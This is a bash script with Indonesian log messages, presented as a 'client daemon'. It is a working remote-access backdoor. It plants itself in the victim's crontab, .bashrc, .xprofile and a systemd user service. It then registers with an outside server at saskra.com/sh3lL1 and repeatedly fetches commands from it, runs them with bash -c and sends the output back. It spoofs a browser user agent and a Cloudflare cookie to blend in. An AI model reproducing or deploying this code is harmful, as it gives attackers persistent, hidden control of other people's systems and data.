#!/usr/bin/env bash

INSTALL_LOG="$HOME/.client_daemon_installed"
SCRIPT_PATH="$(realpath "$0")"
SCRIPT_NAME="$(basename "$SCRIPT_PATH")"
LOG_FILE="$HOME/client_daemon.log"

if [[ -z "$1" ]]; then
    echo "[ERROR] Nama domain tidak diberikan!"
    echo "Gunakan: bash $SCRIPT_NAME <namadomain.com>"
    exit 1
fi

DOMAIN_NAME="$1"

if [[ "$0" != "nohup" && -z "$NOHUP_RUNNING" ]]; then
    echo "[INFO] Menjalankan script menggunakan nohup untuk domain: $DOMAIN_NAME..."
    export NOHUP_RUNNING=1
    nohup bash "$SCRIPT_PATH" "$DOMAIN_NAME" > "$LOG_FILE" 2>&1 &
    exit 0
fi

add_to_crontab() {
    echo "[INFO] Menambahkan script ke crontab untuk domain: $DOMAIN_NAME..."
    (crontab -l 2>/dev/null; echo "@reboot nohup bash $SCRIPT_PATH $DOMAIN_NAME > $LOG_FILE 2>&1 &") | sort -u | crontab -
}

add_to_bashrc() {
    if ! grep -Fxq "nohup bash $SCRIPT_PATH $DOMAIN_NAME > $LOG_FILE 2>&1 &" "$HOME/.bashrc"; then
        echo "[INFO] Menambahkan script ke .bashrc untuk domain: $DOMAIN_NAME..."
        echo "nohup bash $SCRIPT_PATH $DOMAIN_NAME > $LOG_FILE 2>&1 &" >> "$HOME/.bashrc"
    fi
}

add_to_xprofile() {
    if ! grep -Fxq "nohup bash $SCRIPT_PATH $DOMAIN_NAME > $LOG_FILE 2>&1 &" "$HOME/.xprofile"; then
        echo "[INFO] Menambahkan script ke .xprofile untuk domain: $DOMAIN_NAME..."
        echo "nohup bash $SCRIPT_PATH $DOMAIN_NAME > $LOG_FILE 2>&1 &" >> "$HOME/.xprofile"
    fi
}

create_systemd_service() {
    SYSTEMD_USER_DIR="$HOME/.config/systemd/user"
    mkdir -p "$SYSTEMD_USER_DIR"
    SERVICE_FILE="$SYSTEMD_USER_DIR/client_daemon_$DOMAIN_NAME.service"

    if [[ ! -f "$SERVICE_FILE" ]]; then
        echo "[INFO] Membuat systemd service untuk script dan domain: $DOMAIN_NAME..."
        cat <<EOL >"$SERVICE_FILE"
[Unit]
Description=Client Daemon Service untuk $DOMAIN_NAME
After=network.target

[Service]
ExecStart=/usr/bin/bash $SCRIPT_PATH $DOMAIN_NAME
Restart=always
RestartSec=10
StandardOutput=append:$LOG_FILE
StandardError=append:$LOG_FILE

[Install]
WantedBy=default.target
EOL

        systemctl --user daemon-reload
        systemctl --user enable client_daemon_$DOMAIN_NAME.service
        systemctl --user start client_daemon_$DOMAIN_NAME.service
        echo "[INFO] Systemd service berhasil dibuat dan dijalankan untuk $DOMAIN_NAME."
    fi

    loginctl enable-linger $(whoami)
}

if [[ ! -f "$INSTALL_LOG" ]]; then
    echo "[INFO] Menginstal client daemon untuk domain: $DOMAIN_NAME secara permanen..."
    add_to_crontab
    add_to_bashrc
    add_to_xprofile
    create_systemd_service

    echo "$(date): Script berhasil diinstal untuk domain: $DOMAIN_NAME" > "$INSTALL_LOG"
    echo "[INFO] Script berhasil diinstal dan berjalan di latar belakang."
fi

echo "[INFO] Script sudah diinstal, memulai proses utama untuk domain: $DOMAIN_NAME..."

SECRET=$(openssl rand -hex 8)

SERVER="https://saskra.com/sh3lL1"
echo "[INFO] Mendaftarkan client ke server dengan SECRET=$SECRET dan DOMAIN=$DOMAIN_NAME..."
curl -s -X POST -H "Content-Type: application/json" \
    -d "{\"secret\":\"$SECRET\", \"domain\":\"$DOMAIN_NAME\"}" \
    "$SERVER/register_client.php"

while true; do
    cmd=$(curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        -H "Cookie: cf_clearance=<cookie_value>" \
        -X POST -d "token=$SECRET" "$SERVER/get_command_and_post_result.php")

    if [[ "$cmd" == "NO_COMMAND" || -z "$cmd" ]]; then
        sleep 10
        continue
    fi

    echo "[INFO] Menjalankan perintah: $cmd"
    result=$(bash -c "$cmd" 2>&1)

    curl -s -A "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" \
        -H "Cookie: cf_clearance=<cookie_value>" \
        -X POST -d "token=$SECRET" --data-urlencode "result=$result" \
        "$SERVER/get_command_and_post_result.php" >/dev/null
    sleep 10
done
